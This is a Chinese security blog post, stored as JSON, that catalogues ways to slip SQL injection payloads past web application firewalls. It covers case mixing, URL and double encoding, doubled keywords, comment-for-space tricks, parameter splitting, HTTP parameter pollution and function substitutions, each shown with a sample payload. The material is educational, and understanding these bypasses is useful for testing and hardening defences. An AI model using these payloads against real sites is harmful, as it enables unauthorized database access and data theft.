{"title":"当SQL注入遇到WAF","date":"2018-09-19T11:07:41.000Z","slug":"summary-sqli-bypass","tags":["SQLi","Web"],"updated":"2018-10-07T13:17:59.206Z","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>目前，有越来越多的网站上了 WAF ，有硬WAF，软WAF，云WAF，内嵌WAF。给SQL注入的利用带来不小麻烦，下面总结些常见的 WAF Bypass 姿势。</p>\n<hr>\n<h2 id=\"Bypass-姿势\"><a href=\"#Bypass-姿势\" class=\"headerlink\" title=\"Bypass 姿势\"></a>Bypass 姿势</h2><h3 id=\"大小写混合\"><a href=\"#大小写混合\" class=\"headerlink\" title=\"大小写混合\"></a>大小写混合</h3><p>在规则匹配时，只过滤了特定的大写或小写，可以通过混合大小写的方式绕过。（目前很少有这种情况出现）</p>\n<blockquote>\n<p>UniON SelEcT 1,2,3</p>\n</blockquote>\n<h3 id=\"URL-编码\"><a href=\"#URL-编码\" class=\"headerlink\" title=\"URL 编码\"></a>URL 编码</h3><ol>\n<li><p>有些 WAF 不会对普通字符进行 URL编码，可以对 payload 进行 URL 编码来绕过。</p>\n<blockquote>\n<p>%55%6e%49%6f%6e%20%53%65%4c%65%43%74%20%31%2c%32%2c%33%2c%34 – UnIon SeLeCt 1,2,3,4</p>\n</blockquote>\n</li>\n<li><p>还有些 WAF 可能只进行了一次解码，如果 Web 程序中有对参数进行了一次解码，那么还是可以绕过。</p>\n<p> 如下图：</p>\n<p> <img src=\"/post/summary-sqli-bypass/double-encode.png\" alt=\"double-encode\"></p>\n</li>\n</ol>\n<h3 id=\"替换关键字\"><a href=\"#替换关键字\" class=\"headerlink\" title=\"替换关键字\"></a>替换关键字</h3><p>WAF 通过替换或删除 <code>select</code> <code>union</code> 等关键词来过滤，且只过滤了一次的情况时，可以双写关键字来绕过。</p>\n<blockquote>\n<p>UniUnioNon SeSelecTlect 1,2,3,4</p>\n</blockquote>\n<h3 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h3><p>WAF 在过滤空格时，可以用注释来替代。</p>\n<blockquote>\n<p>union/*1*/select/*1*/1,2,3,4</p>\n</blockquote>\n<h3 id=\"多参数请求拆分\"><a href=\"#多参数请求拆分\" class=\"headerlink\" title=\"多参数请求拆分\"></a>多参数请求拆分</h3><p>如果多个参数会拼接到同一条 SQL 语句中，可以将注入的语句拆分插入。</p>\n<p>如发出请求 ：</p>\n<blockquote>\n<p>a=[data1]&amp;b=[data2]</p>\n</blockquote>\n<p>拼接到 SQL 语句中，变成 ：</p>\n<blockquote>\n<p>and a=[data1] and b=[data2]</p>\n</blockquote>\n<p>那么，可以构造 payload ：</p>\n<blockquote>\n<p>a=unIOn/<em>&amp;b=</em>/Select 1,2,3,4</p>\n</blockquote>\n<p>SQL 语句就变成 ：</p>\n<blockquote>\n<p>and a=unIOn/<em> and b=</em>/Select 1,2,3,4</p>\n</blockquote>\n<h3 id=\"HTTP-参数污染\"><a href=\"#HTTP-参数污染\" class=\"headerlink\" title=\"HTTP 参数污染\"></a>HTTP 参数污染</h3><p>当同一参数出现多次时，不同的中间件会解析出不同的结果。</p>\n<p>在 <code>ASP / IIS</code> ， <code>ASP.NET / IIS</code> 下，多个同一参数会被逗号 <code>,</code> 给拼接起来。</p>\n<p>如 ：</p>\n<blockquote>\n<p>?inject=select&amp;inject=1&amp;inject=2&amp;inject=3&amp;inject=4</p>\n</blockquote>\n<p>如果 WAF 只检测同参数名中第一个或最后一个，由于 <code>IIS</code> 的特性则可以成功绕过 WAF。</p>\n<h3 id=\"生僻函数\"><a href=\"#生僻函数\" class=\"headerlink\" title=\"生僻函数\"></a>生僻函数</h3><p>WAF 使用黑名单机制，过滤某些函数，如报错注入时使用的 <code>updatexml()</code> 函数，可以用 <code>polygon()</code> 替代。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>空格绕过:  <code>/*1*/</code> <code>()</code> <code>tab</code> <code>/**/</code> <code>%0a</code> <code>%20</code> <code>%09</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>%a0</code> <code>%00</code></p>\n<p>引号绕过： 使用十六进制，将查询的参数使用十六进制替换。</p>\n<p>注释符绕过：</p>\n<p>逗号绕过：</p>\n<ol>\n<li><p><code>from to</code></p>\n<p> select substr(database() from 1 to for)</p>\n</li>\n<li><p>join</p>\n<p> union select 1,2</p>\n<p> #等价于</p>\n<p> union select * from (select 1)a join (select 2)b</p>\n</li>\n<li><p>like</p>\n<p> select ascii(mid(user(),1,1))=80</p>\n<p> #等价于</p>\n<p> select user() like ‘r%’</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">等价函数</span><br><span class=\"line\"></span><br><span class=\"line\">hex()、bin() ==&gt; ascii()</span><br><span class=\"line\"></span><br><span class=\"line\">sleep() ==&gt;benchmark()</span><br><span class=\"line\"></span><br><span class=\"line\">concat_ws()==&gt;group_concat()</span><br><span class=\"line\"></span><br><span class=\"line\">mid()、substr() ==&gt; substring()</span><br><span class=\"line\"></span><br><span class=\"line\">@@user ==&gt; user()</span><br><span class=\"line\"></span><br><span class=\"line\">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p>《Web安全攻防》</p>\n<p><a href=\"http://www.mamicode.com/info-detail-2361120.html\" target=\"_blank\" rel=\"noopener\">SQL注入防御绕过——二次编码之干掉反斜杠</a></p>\n","prev":{"title":"渗透日记-20181005","slug":"pentest-20181005"},"next":{"title":"PHP中的命令执行","slug":"summary-command-execution"},"link":"http://Jayl1n.github.io/post/summary-sqli-bypass/","toc":[{"title":"前言","id":"前言","index":"1"},{"title":"Bypass 姿势","id":"Bypass-姿势","index":"2","children":[{"title":"大小写混合","id":"大小写混合","index":"2.1"},{"title":"URL 编码","id":"URL-编码","index":"2.2"},{"title":"替换关键字","id":"替换关键字","index":"2.3"},{"title":"注释","id":"注释","index":"2.4"},{"title":"多参数请求拆分","id":"多参数请求拆分","index":"2.5"},{"title":"HTTP 参数污染","id":"HTTP-参数污染","index":"2.6"},{"title":"生僻函数","id":"生僻函数","index":"2.7"}]},{"title":"总结","id":"总结","index":"3"},{"title":"参考链接","id":"参考链接","index":"4"}]}